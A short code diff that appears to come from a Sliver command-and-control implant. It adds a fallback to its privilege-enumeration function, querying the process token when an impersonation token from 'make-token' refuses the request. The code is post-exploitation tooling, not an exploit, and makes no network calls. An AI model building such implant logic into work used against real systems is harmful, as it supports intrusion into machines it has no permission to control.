@@ -107,9 +107,21 @@ int sliver_getprivs(sliver_priv_t *out, int max, char *integrity, size_t integri
   }
   if (!GetTokenInformation(token, TokenPrivileges, privs, size, &size) ||
       privs->PrivilegeCount > 128) {
+    /* An identification-level impersonation token refuses TokenPrivileges: retry
+     * with the process token so getprivs still answers after make-token. */
     free(privs);
     (void)CloseHandle(token);
-    return -1;
+    token = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+      return -1;
+    }
+    size = 4096;
+    privs = (TOKEN_PRIVILEGES *)calloc(1, 4096);
+    if (privs == NULL || !GetTokenInformation(token, TokenPrivileges, privs, size, &size)) {
+      free(privs);
+      (void)CloseHandle(token);
+      return -1;
+    }
   }
   LOG_DEBUG("privs: count=%lu", (unsigned long)privs->PrivilegeCount);
   for (DWORD i = 0; i < privs->PrivilegeCount && count < max; ++i) {
